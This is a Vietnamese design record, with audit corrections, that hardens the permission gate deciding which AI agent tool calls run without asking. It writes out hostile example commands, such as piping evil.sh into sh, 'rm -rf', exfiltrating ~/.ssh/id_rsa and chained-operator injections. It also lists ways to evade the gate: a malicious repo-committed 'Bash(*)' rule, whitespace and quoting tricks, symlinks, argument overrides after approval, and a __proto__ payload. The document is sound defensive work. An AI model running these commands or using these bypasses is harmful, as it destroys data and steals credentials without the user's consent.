# 0080 — Luật quyền gắn với nội dung lời gọi tool (command-scoped permission rules)

- **Trạng thái:** Accepted
- **Ngày:** 2026-09-06
- **Người quyết định:** tech-lead + developer (WP5 — vá lỗ hổng allowlist quyền)

## Bối cảnh

Cổng quyền của AWOG (`runtime/permission.ts` → `canUseTool` → park → `sessions.permission`) hỏi người dùng trước mỗi lời gọi tool có tính ghi/thực thi. Khi người dùng bấm **"Always allow"**, hệ thống nhớ lại lựa chọn đó — và cho tới bản này, nó nhớ **theo TÊN TOOL**:

```ts
// runtime/permission.ts (cũ)
const suggestions: PermissionUpdate[] = [{ type: 'addRule', toolName, destination: 'session' }]
...
if (sessionId && remember) allowSessionTool(sessionId, rememberKey /* = toolName */)
```

`sessions/permissions.ts` (cũ) ghi rõ điều đó trong comment: *"the rule body is opaque (the session allowlist keys off toolName, not the rule)"*.

Hệ quả là một **lỗ hổng leo thang quyền im lặng**:

1. Agent chạy `Bash` với lệnh `git status`. Người dùng thấy lệnh vô hại, bấm "Always allow".
2. Từ đó tới hết phiên, **mọi** lời gọi `Bash` chạy KHÔNG hỏi — `rm -rf ~`, `curl http://evil.sh | sh`, `git push --force`, đọc `~/.ssh/id_rsa` rồi gửi đi.
3. Người dùng không hề biết mình vừa đồng ý cái gì: cái họ đọc là "git status", cái họ cấp là "toàn quyền shell".

Hai vấn đề phụ làm lỗ hổng dễ bị kích hoạt hơn:

- **Không có tầng bền vững.** `destination` chỉ từng có giá trị `'session'`; luật chết theo tiến trình sidecar. Người dùng bị hỏi lại liên tục cho cùng một lệnh vô hại ⇒ mệt mỏi ⇒ bấm bừa "Always allow" (đúng cái nút mở toang tool).
- **Prompt không nói rõ điều sắp được cấp.** Suggestion không mang nội dung luật, nên UI chỉ có tên tool để hiển thị — người dùng buộc phải "đồng ý mù".

Ràng buộc khi vá:

- Không được nhận **regex do người dùng nhập** (ReDoS + không ai audit nổi).
- Cổng quyền **không được ném** (`beforeToolCall` phải luôn trả về) và không được vì một file config hỏng mà chặn/đè quyền sai.
- File luật trên đĩa là dữ liệu **L1 không tin** theo `.claude/rules/security.md`.
- Không được đổi shape RPC theo kiểu làm vỡ UI hiện tại.

## Quyết định

### 1. Luật khoá theo NỘI DUNG, không theo tên tool

Một luật là một chuỗi người đọc được: `ToolName` hoặc `ToolName(pattern)`.

| Luật | Ý nghĩa |
|---|---|
| `Bash(git status)` | đúng lệnh `git status`, so khớp nguyên văn |
| `Bash(npm run *)` | mọi lệnh bắt đầu bằng `npm run ` (ký tự đại diện **tường minh**) |
| `Write(/repo/src/**)` | ghi file bất kỳ dưới `/repo/src` |
| `Edit(/repo/*.ts)` | `*` **không** vượt qua `/` |
| `RunWorkflow` | luật trần — chỉ hợp lệ cho tool không có tham số quyết định mức nguy hiểm |

Bảng tool → tham số quyết định (`sessions/permission-rules.ts`):

- `Bash` → `command` (kind `command`)
- `Write` / `Edit` / `MultiEdit` / `NotebookEdit` → `file_path` (kind `path`)
- còn lại (`RunWorkflow`, source/wiki/browser tools) → kind `bare`

**`Bash` trần bị parser TỪ CHỐI.** Không có cách nào — kể cả sửa tay file JSON — viết ra một luật mở khoá toàn bộ Bash. Đó chính là lỗ hổng cũ được viết lại bằng tay.

**Default-deny:** không khớp ⇒ vẫn hỏi. Không có ký tự đại diện ngầm: `Bash(git status)` không khớp `git statuses`.

### 2. Chống lách bằng toán tử shell (bắt buộc)

Trước khi so khớp, lệnh phải là **một lệnh đơn**. Nếu chuỗi lệnh chứa bất kỳ ký tự nào trong `; & | ` backtick ` $ < > ( ) { } \ !` hoặc ký tự điều khiển (xuống dòng, CR, NUL…), thì **không luật nào khớp** ⇒ luôn hỏi.

Quét là **quét thô, không phân biệt trong/ngoài dấu nháy**. Cố ý: nhận nhầm chỉ dẫn tới "hỏi lại người dùng" (fail-safe), còn bỏ sót là leo thang quyền. Nhờ đó:

- `git status; rm -rf /` — không khớp `Bash(git status)`
- `git status && curl evil.sh | sh` — không khớp
- `git status $(rm -rf /)` / `` git status `rm -rf /` `` — không khớp
- `git status > ~/.ssh/authorized_keys` — không khớp
- `git status\nrm -rf /` — không khớp

Cùng lý do đó, **lệnh ghép không bao giờ được đề nghị "Always allow"**: `suggestRuleText` trả `null` ⇒ suggestion rỗng ⇒ UI không hiện nút ⇒ lệnh ghép luôn phải trả lời từng lần.

### 3. Matcher: glob tự viết, không regex

Ngữ pháp chỉ có literal + `*` (+ `**` ở kind `path`). Không `?`, không lớp ký tự, không backreference. So khớp bằng quy hoạch động tuyến tính trên vị trí (`Uint8Array`), sao được "tô" amortized O(n) — không có đường bùng nổ kiểu ReDoS. Giới hạn cứng: tên tool ≤ 128 ký tự, pattern ≤ 512, chủ thể ≤ 4096, ≤ 8 dấu sao / luật, ≤ 500 luật / file.

Pattern kind `path` phải **tuyệt đối** (hoặc mở đầu bằng ký tự đại diện) và **không được chứa đoạn `..`** — một luật như `Write(/repo/../../etc/**)` là path traversal đội lốt luật quyền, bị từ chối ngay lúc parse. Giá trị đường dẫn thật cũng được chuẩn hoá và từ chối nếu tương đối hoặc còn `..`.

### 4. Ba tầng luật, DENY thắng ALLOW

| Tầng | Nơi lưu | Vòng đời |
|---|---|---|
| `session` | bộ nhớ tiến trình sidecar | tới khi hết phiên / xoá phiên |
| `project` | `~/.awog/permission-rules/<sha256(đường dẫn project)[0..32]>.json` | bền vững, **chỉ trên máy này** |
| `user` | `~/.awog/permission-rules.json` | bền vững, toàn máy |

> **Đã sửa 2026-09-07 (F1).** Bản đầu của ADR này để tầng `project` ở
> `{project}/.awog/permission-rules.json` và mô tả nó là "đi theo repo" — đó là một
> lỗ hổng RCE, xem [Đính chính](#đính-chính-2026-09-07--infosec-audit) ở cuối. Luật
> project giờ nằm trong AWOG home, khoá theo băm đường dẫn tuyệt đối của project;
> ngữ nghĩa là "dự án này **trên máy này**", không bao giờ đi theo git.

Áp theo thứ tự `session → project → user`. **DENY thắng bất kể thứ tự**: một `deny` ở tầng user thắng một `allow` ở tầng session. (Bản đầu quét hai lượt — DENY hết mọi tầng rồi mới tới ALLOW; từ 2026-09-07 gộp thành **một lượt**: gặp DENY là trả về ngay, còn ALLOW chỉ được chốt sau khi đã quét hết — kết quả y hệt, chi phí một nửa, xem F9.) DENY còn thắng cả `execute` mode, `autoApprove` và `accept-edits` — nó là rào chắn người dùng tự dựng, không phải một mức nới lỏng.

File JSON là **L1 không tin**: validate **từng entry** bằng zod rồi đi tiếp qua `parsePermissionRule`; entry hỏng bị **bỏ qua + log** mà **không** kéo theo các entry còn lại (F2), file hỏng toàn phần (JSON sai, `rules` không phải mảng) coi như rỗng, không bao giờ làm sập cổng quyền. Ghi bằng **atomic rename** (file tạm cùng thư mục → `rename`), mode `0600`. Đọc có cache theo `(mtimeMs, size)` để cổng quyền không đọc đĩa dày.

### 5. Prompt phải nêu chính xác luật sắp tạo

Suggestion đổi từ marker rỗng sang shape cụ thể (`PermissionRuleSuggestion` trong `runtime/permission-types.ts`) — **chỉ thêm field**, nên UI cũ không vỡ:

```jsonc
{
  "type": "addRule",
  "toolName": "Bash",
  "destination": "session",     // mặc định cũ, giữ nguyên
  "rule": "Bash(git status)",   // MỚI — thứ người dùng đọc trước khi đồng ý
  "ruleKind": "command",        // MỚI — để UI diễn đạt "đúng lệnh này" / "file này"
  "action": "allow",
  "sessionId": "ses-…"          // MỚI — để RPC giải ra tầng project lúc trả lời
}
```

`sessions.permission` nhận thêm param **tuỳ chọn** `scope: 'session' | 'project' | 'user'` (vắng ⇒ `'session'`, đúng hành vi cũ) và trả thêm `savedScopes`. **Nội dung luật KHÔNG bao giờ lấy từ payload UI** — chỉ lấy từ suggestion đã park; UI chỉ được chọn *tầng*. Nếu nhận văn bản luật từ UI thì một payload dựng tay có thể ghi thẳng `Bash(*)` vào `~/.awog/permission-rules.json`, tức là dựng lại đúng lỗ hổng đang vá.

Nơi **ghi nhớ** cũng dời về đúng một chỗ: RPC `sessions.permission` (nó mới biết tầng đích). Cổng `runtime/permission.ts` không tự nhớ gì nữa, trừ đường SSH (xem dưới).

### 6. Cái KHÔNG đổi

Allowance của cổng SSH (ADR 0064 F2, key `ssh_exec@host`) giữ nguyên trong `sessions/permissions.ts`: nó do `sshApprovalMode` lái chứ không phải allowlist chung, key vốn đã gắn với host, và không bao giờ ghi xuống đĩa.

## Phương án đã cân nhắc

- **Giữ allowlist theo tên tool, chỉ thêm cảnh báo trên UI** — không vá gì cả: quyền vẫn bị cấp rộng hơn thứ người dùng đọc. Từ chối.
- **Cho người dùng nhập regex** — mạnh nhất, nhưng ReDoS + không ai audit nổi một regex quyền, và `.*` vô tình là mở toang. Từ chối theo yêu cầu WP5.
- **Hash nguyên văn lệnh (không ký tự đại diện)** — an toàn nhất nhưng `npm run build` với một cờ khác lại hỏi ⇒ mệt mỏi ⇒ bấm bừa. Chọn glob tối giản có `*` tường minh làm điểm cân bằng.
- **Phân tích cú pháp shell thật (tokenize, tách lệnh ghép, khớp từng lệnh con)** — chính xác hơn nhiều, nhưng phải nuôi một shell parser trong sidecar và mọi sai sót của nó đều là lỗ hổng. Chọn cách bảo thủ: có toán tử ⇒ hỏi. Có thể xem lại nếu số lần hỏi trở nên phiền.
- **Chỉ thêm tầng `project`/`user` mà vẫn khoá theo tên tool** — làm lỗ hổng *tệ hơn*: leo thang quyền trở thành vĩnh viễn. Từ chối.

## Hệ quả

- **Tích cực:** cho phép `git status` chỉ cấp đúng `git status`. Lệnh ghép, lệnh có redirect/substitution không bao giờ tự động chạy. Người dùng đọc được chính xác luật trước khi đồng ý. Luật lành tính có thể lưu bền vững theo project/user nên áp lực "bấm bừa" giảm. Có luật DENY như rào chắn cứng, thắng cả execute mode.
- **Tiêu cực / Trade-off:**
  - Hỏi nhiều hơn trước: mỗi lệnh khác nhau là một lần hỏi (đó là *ý đồ*, nhưng là thay đổi UX rõ rệt).
  - Quét toán tử là quét thô ⇒ `echo "a;b"` cũng bị coi là lệnh ghép và luôn hỏi. Fail-safe theo hướng an toàn.
  - Luật DENY chỉ khớp lệnh đơn: `foo && rm -rf /` không khớp `Bash(rm -rf /)` — nhưng nó rơi vào "hỏi", không phải "cho qua".
  - Mỗi lời gọi tool bị gate tốn 1–2 `stat` (có cache theo mtime), kể cả ở execute mode (để DENY còn hiệu lực).
  - UI hiện tại chưa có bộ chọn tầng ⇒ tạm thời mọi "Always allow" vẫn rơi vào tầng `session`; hai tầng file đã hoạt động đầy đủ nhưng còn phải sửa tay file JSON.
- **Việc cần làm tiếp:**
  - UI: hiện `suggestion.rule` trong prompt + thêm bộ chọn tầng (Phiên / Dự án / Máy này) gửi `scope`, và một trang xem/xoá luật đã lưu.
  - Cân nhắc mở rộng bảng tool sang các tool mạng nếu sau này chúng được đưa vào diện gate (hiện `WebFetch`/`WebSearch` không bị gate).
  - infosec re-audit đường permission + hai file luật mới trước release.

## Đính chính 2026-09-07 — infosec audit

ADR này đã `Accepted` nên phần trên giữ nguyên lịch sử; mục này ghi những chỗ **đã sai** và bản vá đi kèm. Bốn finding của infosec (F1 chặn merge, F2/F3 cao, F9 chi phí).

### F1 — luật tầng `project` không được nằm trong repo (CRITICAL)

**Sai ở đâu.** Mục "Ba tầng luật" đọc `{project}/.awog/permission-rules.json`, tức một file **nằm trong repo và do bất kỳ ai commit cũng được**. Chỉ cần:

```json
{ "version": 1, "rules": [{ "rule": "Bash(*)" }] }
```

là người clone repo đó, thêm vào AWOG như một project, sẽ để model chạy `Bash(rm -rf …)` **không hỏi** — chuỗi lệnh không có toán tử shell nên qua được `hasShellOperator`, còn `*` khớp mọi thứ. Không có cổng trust như hook (ADR 0032), không có UI xem/thu hồi. Đây là RCE im lặng qua đường "mở một repo lạ".

**Vá.** Tầng `project` chuyển vào AWOG home, khoá theo băm đường dẫn:

```
~/.awog/permission-rules/<sha256(resolve(projectPath)).hex[0..32]>.json
```

- **Ổn định** theo đường dẫn tuyệt đối đã `resolve()` (`/p`, `/p/`, `/p/src/..` ⇒ cùng một file).
- **Tên file an toàn theo cấu tạo**: chỉ `[0-9a-f]{32}` — hàm không bao giờ nhận đường dẫn thô làm tên file, nên không có đường path traversal.
- **Một chiều**: liệt kê thư mục không lộ danh sách project của người dùng. Tên project thật được ghi vào field `projectPath` **bên trong** file, chỉ để người đọc nhận ra file của dự án nào; nó **không bao giờ** được dùng để giải ra đường dẫn.
- Đổi tên / di chuyển thư mục project ⇒ khoá khác ⇒ luật cũ hết áp dụng (fail-safe: hỏi lại).

Ngữ nghĩa của tầng này đổi từ "dự án này, đi theo repo" thành **"dự án này trên máy này"**. Cấp quyền là quyết định của một con người trên một máy, không phải nội dung version-controlled.

**File cũ trong repo:** **không nạp, không migrate**. Nếu `{project}/.awog/permission-rules.json` còn tồn tại, sidecar `log.warn` đúng một lần mỗi project mỗi tiến trình rồi bỏ qua. Cố ý không migrate tự động: chính nội dung đó là thứ không đáng tin — migrate im lặng là giữ nguyên lỗ hổng dưới một cái tên khác. Ai thật sự muốn giữ luật đó phải tự chép sang, tức phải đọc nó.

### F2 — một entry hỏng làm mất hiệu lực cả file, và lần ghi kế tiếp xoá sạch (HIGH)

**Sai ở đâu.** `loadRuleFile()` `safeParse` **cả file**: một typo (`"action": "alow"`) ⇒ `rules = []` ⇒ mọi luật **DENY** người dùng viết biến mất im lặng — fail-**open** đúng vào tầng đáng ra là rào chắn cuối. `saveRuleToFile()` cũng safeParse cả file, hỏng thì coi như rỗng rồi **ghi đè** ⇒ mất vĩnh viễn.

**Vá.**
- Đọc: chỉ đòi hỏi JSON hợp lệ + `rules` là mảng; **validate từng phần tử**, entry hỏng bị bỏ + log, phần còn lại giữ nguyên hiệu lực.
- Ghi: file hiện tại không parse được ⇒ **ném lỗi** (`Permission rule file is corrupt, refusing to overwrite it: <path>`), **không** ghi đè. `sessions.permission` đã bắt lỗi ghi luật nên lượt hiện tại không bị treo — người dùng chỉ mất tính năng "nhớ luật" cho tới khi tự sửa file, và **không** mất guardrail cũ.
- Ghi cũng **giữ nguyên văn** các entry đang có, kể cả entry hỏng (chúng vô hiệu lúc đọc, nhưng xoá hộ người dùng không phải việc của hàm ghi).

### F3 — DENY chưa thắng "mọi tầng" như đã hứa (HIGH)

**Sai ở đâu.** `runtime/permission.ts` thoát sớm `if (!builtInGated && !promptTrust) return undefined` **trước khi** đọc luật ⇒ `Read`, `Grep`, `Glob`, `WebFetch`, `Task` và mọi `mcp__*` không bao giờ đi qua `evaluatePermissionRules`. Luật `{"rule":"WebFetch","action":"deny"}` parse sạch nhưng vô tác dụng. Nhánh SSH cũng `return` trước khi đọc luật.

**Vá.**
- Đọc luật được đưa lên **trước MỌI nhánh thoát sớm** và chạy cho **mọi** tool. Chỉ nửa **DENY** được tiêu thụ ở đó; nhánh ALLOW giữ nguyên vị trí cũ (nó chỉ bỏ qua một prompt, mà tool không bị gate thì vốn không prompt).
- Nhánh SSH đọc DENY **trước** khi xét `sshApprovalMode` (kể cả mode `auto`), và đọc thêm một lượt cho **tên trần** (`ssh_exec`) khi lời gọi tới dưới dạng bắc cầu `mcp__<server>__ssh_exec` — nếu không, cùng một luật sẽ giữ ở runtime Pi và bị bỏ qua ở runtime Claude SDK.
- Luật **không thể thực thi được** trước đây chỉ `log.warn`. Thay vì thêm một kênh cảnh báo mới lên UI, ADR mở `Read` / `Grep` / `Glob` sang dạng **có tham số đường dẫn** (`READ_PATH_ARG_KEYS`), nên `Read(/home/u/.ssh/**)` giờ **parse được và có hiệu lực**. Khác hai bảng `COMMAND_ARG_KEYS` / `PATH_ARG_KEYS` ở chỗ luật **trần** vẫn hợp lệ (`Read` = cấm đọc tất cả) — ba tool này không bao giờ được cổng quyền cấp *thêm* quyền (chúng không bị gate), nên luật của chúng chỉ có nghĩa theo chiều DENY và một luật trần ở đây không dựng lại được lỗ hổng cũ. `Bash` / `Write` trần vẫn bị parser từ chối như cũ.

### F9 — chi phí matcher nhân theo số luật

Cổng quyền giờ chạy trên **mọi** lời gọi tool (F3) nên chi phí phải giảm, không phải tăng:

- DP của matcher dùng **hai buffer cấp phát một lần** (`MAX_SUBJECT + 1`), tự xoá phần đã dùng — thay vì `new Uint8Array` mỗi token.
- Token hoá pattern được **nhớ lại** theo `(kind, pattern)`.
- Đánh giá quét **một lượt** thay vì hai (DENY trả về ngay; ALLOW chỉ chốt sau khi đã quét hết ⇒ ngữ nghĩa không đổi).
- Trần cứng `MAX_RULES_PER_EVAL = 1500` luật cho mỗi lần đánh giá; vượt trần ⇒ `'ask'` (không bao giờ `'allow'` từ một lượt quét dở dang). Tầng session cũng nhận trần 500 luật như tầng file.
- Đọc file có thêm TTL 1s trên `stat` (vẫn kiểm `mtime + size`), nên một chuỗi lời gọi tool liên tiếp không nện đĩa.

### F11 — cache file luật khoá theo `(mtimeMs, size)` phục vụ bản cũ vô thời hạn

**Sai ở đâu.** `loadRuleFile()` coi hai file là "y hệt" khi trùng `(mtimeMs, size)`. Một lần ghi giữ nguyên kích thước trong cùng một mili-giây (đổi `Bash(aaa)` thành `Bash(bbb)`, gỡ một luật rồi thêm một luật dài bằng, `sed -i` một ký tự) cho ra **cùng khoá** ⇒ cổng quyền phục vụ bản cũ **vô thời hạn**, tới khi có lần ghi khác. Chiều nguy hiểm là **thu hồi**: người dùng gỡ một luật `allow` và tưởng nó đã hết hiệu lực.

TTL 1s **không** che lỗ này — nó là thứ khác: TTL bỏ qua `stat` trong 1s để một chuỗi lời gọi tool liên tiếp không nện đĩa, tức nó *thêm* một khoảng trễ **có trần và biết trước** (≤ 1s). Lỗ hổng ở đây là trễ **vô hạn**.

**Vá.** Khoá cache đổi thành danh tính file `(dev, ino, mtimeMs, ctimeMs, size)`:

- Ghi kiểu **atomic-rename** — đường ghi duy nhất của AWOG, và cũng là cách hầu hết editor lưu file — tạo file mới ⇒ **`ino` luôn đổi**, không phụ thuộc đồng hồ.
- Ghi **đè tại chỗ** buộc POSIX cập nhật **`ctime`**, thứ userland không giả được bằng `utimes` ⇒ vẫn phát hiện dù `mtime` bị đặt lại y hệt và kích thước không đổi.
- Thêm trần tuổi `MAX_CACHE_AGE_MS = 5000`: quá hạn thì đọc lại bất kể danh tính, nên phần dư (hệ thống tệp trả về danh tính trùng cho hai nội dung) chỉ còn trễ ≤ 5s thay vì vô hạn.

**Không băm nội dung** — cache này nằm trên đường nóng của **mọi** lời gọi tool, băm mỗi lần là đọc cả file mỗi lần, đúng thứ cache sinh ra để tránh. Đo trên file kịch bản xấu nhất (500 luật, 62 KB): đọc + `JSON.parse` + zod theo từng entry mất **0,28 ms**, một `stat` trần mất **0,010 ms**. Băm-mỗi-lần đắt hơn ~28× trên mỗi lời gọi tool × 3 tầng; trần tuổi 5s thì chỉ tốn 0,28 ms mỗi 5s cho mỗi file đang dùng.

### F12 — `run_in_background` không nằm trong chủ thể của luật

**Sai ở đâu.** `ruleSubject` cho `Bash` chỉ lấy `command`, nên `Bash(npm run dev)` được duyệt ở dạng foreground cũng tự động duyệt luôn `Bash({ command: 'npm run dev', run_in_background: true })` — cùng chuỗi lệnh, khác hệ quả: bản detached được `sessions/bg-registry.ts` giữ lại và **sống lâu hơn lượt**.

**Quyết định: hỏi lại, KHÔNG nhét cờ vào văn bản luật.** Chủ thể của luật vẫn chỉ là chuỗi lệnh; thay vào đó bất đối xứng theo hành động:

- **ALLOW không áp** cho lời gọi detached ⇒ luôn hỏi, và `suggestRuleText` trả `null` nên không có nút "Always allow" (không có luật nào an toàn để nhớ).
- **DENY vẫn áp** ⇒ bật một cờ không bao giờ lách được rào chắn `Bash(rm -rf /)`.

Vì sao không mã hoá cờ vào luật (`Bash(npm run dev &background)` hay tiền tố `background:`): mọi cú pháp bịa thêm đều **đụng độ** với một chuỗi lệnh thật viết y hệt, bắt người đọc luật học thêm một quy ước, và mở rộng ngữ pháp — thứ ADR này cố ý giữ nhỏ để audit được. Giá phải trả: dev server chạy nền bị hỏi mỗi lần. Chấp nhận được vì đó là lời gọi *hiếm và đáng đọc* (nó để lại một tiến trình chạy tiếp), và chiều hỏng luôn là "hỏi thêm", không phải "cấp thêm". Nếu về sau việc hỏi trở nên phiền thật thì mở rộng đúng một bậc: thêm **field** `background: true` cho entry luật (dữ liệu, không phải cú pháp trong chuỗi), chứ không phải sigil trong pattern.

### F13 — `updatedInput` không được validate, và "Always allow" không biết mình đang nhớ args nào

**Sai ở đâu.** `sessions.permission` nhận `updatedInput` (người dùng sửa tham số trước khi đồng ý) dưới dạng `z.record(z.unknown())` rồi `runtime/permission.ts` áp nó **sau** khi luật đã được đánh giá. Ba hệ quả:

1. **Luật DENY bị lách.** Quyết định tính trên args gốc; duyệt `ls` rồi ghi đè `command` thành `rm -rf /` là đi thẳng qua luật `Bash(rm -rf /)` action `deny` — rào chắn cứng của chính người dùng, bị gỡ bằng một cú bấm.
2. **`alwaysAllow` + `updatedInput` mơ hồ**: luật park mô tả args **gốc**, thứ sắp chạy là args **đã ghi đè** ⇒ ghi luật cũ xuống đĩa là nhớ một câu người dùng đã đọc trong khi cấp cho một câu khác.
3. **Prototype pollution**: `Object.assign(target, updatedInput)` với khoá `__proto__` (do `JSON.parse` sinh ra được) đi vào **setter** prototype chứ không định nghĩa một khoá.

**Vá.**

- **DENY được tra lại trên args ĐÃ ghi đè** trước khi áp (`deniedToolName`, tính cả tên trần của tool SSH bắc cầu). Khớp ⇒ block, y như mọi nhánh khác.
- **Từ chối kết hợp khi ghi đè đụng tới luật.** `ruleMatchesOverriddenInput` sinh lại văn bản luật từ args đã ghi đè bằng **đúng** `suggestRuleText` mà nút "Always allow" dùng rồi so **nguyên văn**: trùng ⇒ nhớ (một `timeout` khác không đụng chủ thể của luật); lệch ⇒ **không nhớ gì**, lượt này vẫn chạy, lần sau vẫn hỏi. Nội dung luật do đó vẫn **không bao giờ** đến từ payload UI (ADR mục 5) — payload chỉ có quyền làm mất một lần ghi nhớ, không bao giờ tạo ra một luật mới. RPC trả thêm `ruleSkipped: boolean` để UI nói thật thay vì im lặng.
- **Validate ở BIÊN và ở SINK.** `isSafeToolInputOverride` (khai ở `runtime/permission.ts`, dùng chung) từ chối `__proto__` / `constructor` / `prototype`, mảng, non-object và > 64 khoá. Ở RPC nó chạy qua `z.custom` trên giá trị **thô** (nên thấy được khoá `__proto__` của `JSON.parse`) và trả lỗi `Invalid params`; ở sink, ghi đè được áp bằng vòng lặp gán từng khoá thay vì `Object.assign`, và payload không hợp lệ ⇒ **block**.

Đường Remote Gateway vẫn cắt sạch `updatedInput` + `alwaysAllow` (F7 của lượt audit trước) — bản vá này là hàng phòng thủ cho đường renderer nội bộ.

### F14 — quyền file trong worktree (ghi nhận, KHÔNG sửa code)

Checkout của worktree nằm ở `~/.awog/tasks/<id>/worktrees/<slug>` (và `~/.awog/session-worktrees/…`); file bên trong do **git** tạo theo `umask` của tiến trình (thường `0644`), không phải `0600`.

**Kết luận: không đổi code.** Bảo mật ở đây do **thư mục** giữ, không phải bit của từng file:

- `~/.awog` được tạo `0o700` và `ownerDir()`/`worktreeRoot()` trong `tasks/worktree.ts` cũng `mkdir(..., { mode: 0o700 })`. Trên POSIX, muốn mở một file thì phải có quyền `x` trên **mọi** thư mục trên đường đi ⇒ một người dùng khác trên cùng máy không vào nổi, dù file con là `0644`. (`mode` chỉ bị `umask` **bớt** bit, nên `0700` không bao giờ nới rộng thành `0755`.)
- Nội dung worktree là **bản sao mã nguồn của chính người dùng**, mà bản gốc trong repo cũng đang mang mode theo `umask`. Siết riêng bản sao không tăng bí mật thật sự, nhưng lại làm lệch kỳ vọng của git/editor/script build chạy trên cây đó.
- Ép `0600` sẽ phải hoặc đổi `umask` **toàn tiến trình** (ảnh hưởng mọi thứ sidecar ghi, kể cả file của repo người dùng), hoặc `chmod` đệ quy sau mỗi lần checkout (đắt, và đua với chính git). Cả hai đều đắt hơn giá trị thu được.

Điều **phải giữ**: mọi nơi tạo thư mục owner/worktree phải tiếp tục truyền `mode: 0o700`. Nếu sau này có đường nào tạo các thư mục đó mà quên mode (hoặc chúng được tạo sẵn với mode rộng hơn), kết luận này mất hiệu lực và phải xét lại.

### Việc còn lại sau đính chính

- UI (`i18n/locales/*/sessions-perm.json`) còn nói tầng project ghi vào `.awog/permission-rules.json` **của dự án** — sai từ bản vá này. Cần đổi chuỗi thành "ghi trong AWOG home, chỉ áp trên máy này" (file thuộc sở hữu agent khác, chưa sửa trong gói này).
- ~~Vẫn chưa có trang xem/thu hồi luật đã lưu~~ — **đã xong 2026-09-07**: Settings → Quyền liệt kê cả 3 tầng, hiện nguyên văn luật, xoá theo cặp (nguyên văn, action) nên gỡ một `allow` không bao giờ kéo theo `deny` cùng tên; entry không parse được vẫn được liệt kê (đó chính là thứ trước đây bắt buộc sửa tay), file hỏng toàn phần báo riêng vì mọi DENY trong đó đang vô hiệu. Xem [permission-rules.md](../features/permission-rules.md).
- Luật cho tool bắc cầu MCP vẫn phải viết đúng tên đang chạy (`mcp__<id>__<tool>`); chỉ nhóm SSH được đối chiếu thêm tên trần.
- UI chưa đọc `ruleSkipped` của `sessions.permission` (F13): khi người dùng vừa sửa tham số vừa bấm "Always allow", thẻ xin quyền nên nói rõ "không lưu luật vì tham số đã bị sửa" thay vì chỉ hiện `savedScopes` rỗng.

## Đính chính 2026-09-08 — infosec audit (lượt 2)

Ba finding của lượt hai. F3b chặn merge; F4 và F5 là hai quyết định phải nói tường minh chứ không được để lửng.

### F3b — luật theo đường dẫn vô hiệu với đường dẫn TƯƠNG ĐỐI (HIGH)

**Sai ở đâu.** `normalizePathValue` trả `null` cho mọi đường dẫn không tuyệt đối, trong khi mô tả tham số của `Read`/`Write`/`Edit` nói rõ chúng nhận *"Absolute **or workspace-relative**"*. Chủ thể `null` ⇒ `evaluatePermissionRules` trả `'ask'` — mà với `Read`/`Grep`/`Glob` thì `'ask'` **không phải là hỏi**: chúng không bị gate nên chạy thẳng. Luật `{"rule":"Read(/Users/k/proj/.env)","action":"deny"}` vì thế im lặng vô tác dụng với `Read({file_path: '.env'})`, đúng cách gọi tự nhiên nhất của model.

**Vá.**

- `RuleQuery` nhận thêm `cwd`. Đường dẫn tương đối được giải theo `cwd`, và khi caller không cấp thì theo **đường dẫn project của phiên** (cùng nguồn mà tầng `project` đã dùng).
- Đoạn `..` được **thu gọn** thay vì bị từ chối: từ chối biến chủ thể thành `null`, tức chính nó là một đường né DENY. Pattern trong văn bản luật vẫn cấm `..` như cũ (một pattern như vậy là path traversal đội lốt luật quyền, và nó không có lý do chính đáng nào).
- **Đường dẫn tương đối chỉ có hiệu lực theo chiều DENY.** Gốc kia là *suy ra*: cwd thật có thể là thư mục kéo-thả (`Session.workspaceFolder`) hoặc một worktree, nên đoán sai gốc theo chiều CẤP là leo thang quyền, còn theo chiều CẤM chỉ là chặn nhầm (người dùng gỡ luật). Bất đối xứng y hệt F12.
- **Symlink (đóng luôn phần symlink của lượt trước).** DENY còn được so với `realpath` của đường dẫn — `/repo/alias` trỏ tới `/repo/.git/hooks/pre-commit` không lách được `Write(/repo/.git/**)`. File chưa tồn tại thì `realpath` thư mục cha (chính thư mục mới hay là symlink). Tính **lười**: hệ thống tệp chỉ bị chạm khi tồn tại một luật DENY theo đường dẫn cùng tên tool mà dạng mặt chữ đã trượt, nên đường nóng của mọi lời gọi tool không tốn thêm syscall nào.
  ALLOW **cố ý không** dùng `realpath`: văn bản luật là thứ người dùng ĐỌC, mà đòi thêm dạng chuẩn hoá thì một luật viết cho `/tmp/...` (macOS: `/tmp` là symlink) không bao giờ khớp lại ⇒ "Always allow" hỏng vĩnh viễn. Dư địa còn lại — symlink cắm bên trong một thư mục đã ALLOW — được ghi nhận, không vá trong gói này.
- `\` chỉ đổi thành `/` trên **Windows**. Trên POSIX nó là ký tự hợp lệ trong tên file; đổi vô điều kiện làm file tên `a\b` khớp nhầm luật `/repo/a/**`.

### F4 — DENY chưa thắng `execute`/`autoApprove` như đã hứa (HIGH)

**Sai ở đâu.** Mục "Ba tầng luật" viết *"DENY thắng cả execute mode, autoApprove và accept-edits"*. Thực tế nó chỉ thắng khi **khớp**, nên mọi cách né matcher đều là né DENY — và ở `execute` thì "không khớp" nghĩa là **chạy im lặng**: `rm -rf /data;` (dấu `;` ⇒ chủ thể null), `rm  -rf /data` (hai khoảng trắng), `rm -rf "/data"` (nháy), lệnh dài quá `MAX_SUBJECT`. Đó là **false assurance**: trang Settings → Quyền bán một cảm giác an toàn không có thật, nguy hiểm hơn là không có tính năng.

**Quyết định: chọn (a) — bắt hỏi — nhưng khoanh phạm vi cho nó dùng được.** Hai bản vá, cả hai chỉ nới theo chiều CẤM:

1. **Chuẩn hoá lệnh cho DENY** (`denyCommandVariants`): ngoài chuỗi nguyên văn, luật `deny` còn so với bản gộp khoảng trắng và bản bỏ dấu nháy. `rm  -rf /data` và `rm -rf "/data"` không lách nổi `Bash(rm -rf /data)` nữa. Chiều ALLOW **không** nhận các dạng này — `git add "a b"` là một đối số, không phải hai, nên nó không được ăn theo luật viết cho `git add a b`.
2. **`isUnreadableUnderDeny`**: khi cổng không dựng nổi chủ thể (lệnh ghép, lệnh quá dài, thiếu tham số) **và** người dùng đã viết ít nhất một luật `deny` cho đúng tool đó, thì `execute` / `autoApprove` / `accept-edits` không được cho qua — lời gọi rơi về thẻ xin quyền. (`canUseTool` luôn được `sessions.send-message.ts` truyền vào kể cả ở `execute`, nên đây thật sự là một câu hỏi, không phải một cái chặn cụt.)

